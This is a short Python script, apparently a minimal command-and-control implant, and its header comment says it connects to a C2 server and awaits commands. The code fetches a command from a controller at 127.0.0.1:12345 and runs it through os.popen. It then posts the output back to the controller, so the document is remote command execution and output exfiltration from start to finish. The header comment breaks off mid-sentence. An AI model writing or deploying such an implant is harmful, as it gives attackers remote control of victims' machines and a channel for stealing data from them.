# Script connects to C2 server and awaits commands.
# Executes commands and 

import requests
import os

def get_cmd():
    cmd = requests.get("http://127.0.0.1:12345/cmd").text
    print(cmd)
    return cmd

def execute_cmd(cmd):
    output = os.popen(cmd).read().strip()
    print(output)
    return output

def post_response(response):
    requests.post("http://127.0.0.1:12345/output", data={"data":response})

post_response(execute_cmd(get_cmd()))